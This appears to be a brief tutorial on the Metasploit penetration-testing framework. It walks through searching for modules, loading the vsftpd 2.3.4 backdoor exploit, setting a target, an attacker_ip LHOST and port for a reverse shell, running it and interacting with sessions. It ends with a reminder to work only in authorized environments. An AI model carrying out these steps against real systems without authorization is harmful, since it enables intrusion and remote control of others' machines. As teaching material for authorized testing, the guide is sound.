# Metasploit

Metasploit is a penetration testing framework used to develop, test and execute exploits against vulnerable systems.

It provides a large collection of:

- exploits
- payloads
- auxiliary modules
- post-exploitation modules

Metasploit is commonly used during penetration testing to automate exploitation and post-exploitation tasks.

---

# Installation

Metasploit is included in Kali Linux.

If not installed:

```bash
sudo apt install metasploit-framework
```

Verify installation: ```bash msfconsole ```

---

# Starting Metasploit

Launch the Metasploit console: ```bash msfconsole ```

This opens the main Metasploit interface.

---

# Searching for Modules

Search for available exploits or modules.

Example: ```bash search smb ```

Search for a specific vulnerability: ```bash search type:exploit vsftpd ```

---

# Selecting an Exploit

Use a module: ```bash use exploit/unix/ftp/vsftpd_234_backdoor ```

Show required options: ```bash show options ```

---

# Setting Parameters

Set the target address: ```bash set RHOSTS target_ip ```

Set local host for reverse shell: ```bash set LHOST attacker_ip ```

Set local port: ```bash set LPORT 4444 ```

---

# Running the Exploit

Execute the exploit: ```bash run ``` or ```bash exploit ```

If successful, a session may be created.

---

# Managing Sessions

List active sessions: ```bash sessions ```

Interact with a session: ```bash sessions -i 1 ```

---

# Useful Commands

Show available payloads: ```bash show payloads ```

Show auxiliary modules: ```bash show auxiliary ```

Show post-exploitation modules: ```bash show post ```

---

# Example Workflow

Typical Metasploit workflow:

1. Search for exploit

2. Select module

3. Configure target options

4. Choose payload

5. Run exploit

6. Manage sessions

---

# Notes

Metasploit contains many automated exploits, but understanding the vulnerability being exploited is important.

Blindly running exploits without analysis may produce unreliable results.

Always perform exploitation only in **authorized environments.**